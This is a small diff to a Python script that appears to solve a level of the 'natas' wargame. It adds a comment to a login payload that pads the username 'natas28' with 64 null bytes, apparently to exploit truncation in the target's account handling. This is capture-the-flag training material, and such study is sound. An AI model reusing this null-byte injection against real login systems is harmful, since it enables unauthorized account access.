@@ -26,6 +26,7 @@ def deserialize_attack(url, auth, session, proxies=None):
     print("[+] Injecting malicious input...")
     time.sleep(1)
 
+    # defining username with multiple null bytes 
     data = {"username":'natas28' +'\x00'*64 + 'whatever', 'password': 'hacker'}
 
     session.post(url, auth=auth, data=data, proxies=proxies)
